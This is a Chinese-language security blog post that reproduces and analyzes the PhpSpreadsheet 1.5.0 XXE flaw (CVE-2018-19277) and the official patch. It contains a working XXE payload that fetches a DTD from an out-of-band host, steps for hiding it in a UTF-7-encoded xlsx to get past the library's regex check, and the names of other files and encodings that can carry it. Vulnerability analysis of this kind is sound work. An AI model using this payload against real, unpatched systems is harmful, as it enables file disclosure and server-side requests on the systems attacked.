> 原文链接: https://www.anquanke.com//post/id/170068 


# PhpSpreadsheet 1.5.0 XXE漏洞复现及分析


                                阅读量   
                                **226059**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t012f7c46b3d4cbfd9b.png)](https://p1.ssl.qhimg.com/t012f7c46b3d4cbfd9b.png)



## 0x01 前言

PhpSpreadsheet是一个非常流行的纯PHP类库，能够让你方便的读写Excel、LibreOffic Calc等表格格式的文件，是PHPExcel的替代者。2018年11月13日，PhpSpreadsheet 被爆出存在XXE漏洞（CVE-2018-19277)，在表格的解压文件中插入UTF-7编码的恶意xml payload，可绕过PhpSpreadsheet 库的安全检查造成XXE攻击。



## 0x02 影响范围

PhpSpreadsheet 1.5.0及以下版本



## 0x03 漏洞复现

自Office 2007以后，Excel存储的文件后缀为xlsx，相对于之前的旧版本多了一个X，实质上xlsx文件是一个压缩包。新建一个exploit.xlsx空文件，执行`unzip exploit.xlsx`

[![](https://p2.ssl.qhimg.com/t016e4b9f78650ecc99.png)](https://p2.ssl.qhimg.com/t016e4b9f78650ecc99.png)

将如下payload进行UTF-7编码，并替换掉xl/worksheets/sheet1.xml。

```
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE xmlrootname [&lt;!ENTITY % aaa SYSTEM "http://xxxxx.ceye.io/lalala.dtd"&gt;%aaa;%ccc;%ddd;]&gt;
```

编码后的payload如下图 ，注意一定要修改xml编码encoding的值。

[![](https://p1.ssl.qhimg.com/t01bb93b73ec05d3fff.png)](https://p1.ssl.qhimg.com/t01bb93b73ec05d3fff.png)

执行`zip -r ../exploit1.xlsx *`进行重打包生成exploit1.xlsx；切换到Web目录，利用composer安装1.5.0版本的PhpSpreadsheet `composer require phpoffice/phpspreadsheet=1.5.0`，在同一目录下新建excel.php，内容如下所示：

```
&lt;?php
error_reporting(-1);
require 'vendor/autoload.php';
$reader = PhpOfficePhpSpreadsheetIOFactory::createReader('Xlsx'); //创建Xlsx读对象
$reader-&gt;setReadDataOnly(TRUE);
$spreadsheet = $reader-&gt;load('exploit1.xlsx'); //加载excel表格文件exploit1.xlsx
?&gt;
```

开启报错提示后，访问excel.php会看到warning信息，有利于我们快速定位到问题函数和所在行。

[![](https://p3.ssl.qhimg.com/t01955679c8bd30fd8e.png)](https://p3.ssl.qhimg.com/t01955679c8bd30fd8e.png)

随后，在ceye平台上看到了解析xml文件时的外部实体请求。

[![](https://p4.ssl.qhimg.com/t01d34f2d821008b8ce.png)](https://p4.ssl.qhimg.com/t01d34f2d821008b8ce.png)



## 0x04 漏洞分析

漏洞分析从我们创建的excel.php开始，文件第4行调用了vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/IOFactory.php的createReader方法，当$readers数组中不存在$readerType的key值时，便会抛出异常。

[![](https://p2.ssl.qhimg.com/t0149e951c2e734185d.png)](https://p2.ssl.qhimg.com/t0149e951c2e734185d.png)

这里传递的`$readerType='Xlsx'`，因此返回对应的value值为`ReaderXlsx::class`

[![](https://p3.ssl.qhimg.com/t01b60ad3d7d87709af.png)](https://p3.ssl.qhimg.com/t01b60ad3d7d87709af.png)

77行则创建了PhpOfficePhpSpreadsheetReaderXlsx对象，随后返回给$reader对象，并调用了load方法；跟进到对应的类文件vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Reader/Xlsx.php，在389行定义了load方法，方法先调用了File类的assertFile方法判断表格文件是否存在，并在402-403调用 ZipArchive类的open方法打开exploit1.xlsx文件便于调用解压后的子文件。

[![](https://p4.ssl.qhimg.com/t017300fd11e4e6df29.png)](https://p4.ssl.qhimg.com/t017300fd11e4e6df29.png)

随后load方法会根据解压后文件类型进行逐一处理，这里不一一分析，根据warning信息直接定位到760行的simplexml_load_string方法，该方法通常用于把 XML 字符串载入对象中，如若使用不当则容易导致XXE漏洞。这里先调用了getFromZipArchive方法处理xl/wordsheets/sheet1.xml，即插入xxe payload的xml文件。

[![](https://p2.ssl.qhimg.com/t01db66d45e8cb1474b.png)](https://p2.ssl.qhimg.com/t01db66d45e8cb1474b.png)

跟进到getFromZipArchive方法，该方法调用了ZipArchive::getFromName方法，根据文件名从压缩文件中获取对应文件的内容并返回。

[![](https://p1.ssl.qhimg.com/t01f1654eddaa480c9c.png)](https://p1.ssl.qhimg.com/t01f1654eddaa480c9c.png)

返回Xlsx.php的757行，getFromZipArchive方法的返回值还经过了securityScan方法处理，跟进到Xlsx类的父类vendor/phpoffice/phpspreadsheet/src/PhpSpreadsheet/Reader/BaseReader.php，securityScan方法利用正则表达式匹配`/?&lt;?!?D?O?C?T?Y?P?E?/`，正是由于采用了UTF-7编码，导致`&lt;!DOCTYPE`字符串被编码，从而绕过了securityScan方法对XXE攻击的防御。

[![](https://p5.ssl.qhimg.com/t01b6c09f62673095cc.png)](https://p5.ssl.qhimg.com/t01b6c09f62673095cc.png)



## 0x05 官方补丁分析

官方在2018年11月21日放出补丁修复了该漏洞，创建了一个PHPOffice/PhpSpreadsheet/src/PhpSpreadsheet/Reader/Security/XmlScanner.php xml内容安全检查的类文件，在Xlsx.php的构造函数中实例化了这个安全类，随后在调用simplexml_load_string方法处理xml内容之前，都会调用安全类的scan方法检查是否存在XXE攻击。

[![](https://p1.ssl.qhimg.com/t01d8b153d623a94429.png)](https://p1.ssl.qhimg.com/t01d8b153d623a94429.png)

我们跟进到XmlScanner.php，发现该类主要采用两个方法防止XXE攻击：一是在构造函数中，当PHP版本为7.x时，设置`libxml_disable_entity_loader(true)`禁止加载外部实体；

[![](https://p5.ssl.qhimg.com/t014e0157694ad434f0.png)](https://p5.ssl.qhimg.com/t014e0157694ad434f0.png)

二是在scan方法中，通过正则匹配XML的编码格式，并将其转换成UTF-8编码，再利用正则匹配是否存在``/?&lt;?!?D?O?C?T?Y?P?E?/`，官方补丁通过两个方法相结合的方式防止XXE攻击。

[![](https://p3.ssl.qhimg.com/t014705e9a20d6f2e6e.png)](https://p3.ssl.qhimg.com/t014705e9a20d6f2e6e.png)



## 0x06 小结

通过分析其实可以发现，Xlsx.php的load方法不单单只处理了xl/wordsheets/sheet1.xml，也解析了包括

```
xl/_rels/workbook.xml.rels
xl/theme/theme1.xml
_rels/.rels
docProps/app.xml
docProps/core.xml
xl/_rels/workbook.xml.rels
xl/styles.xml
xl/workbook.xml
```

可以将UTF-7编码的payload替换上述文件内容，同样可以触发XXE攻击。并且，UTF-7也并非唯一可用编码，诸如UTF-16等可绕过安全正则检查的编码方式也可被利用。PhpSpreadsheet作为PHP处理表格文件最流行的类库，被大量的用户和网站使用，建议开发人员及时升级版本到最新。



## 参考

[https://www.anquanke.com/vul/id/1389396](https://www.anquanke.com/vul/id/1389396)

[https://github.com/PHPOffice/PhpSpreadsheet/issues/771](https://github.com/PHPOffice/PhpSpreadsheet/issues/771)
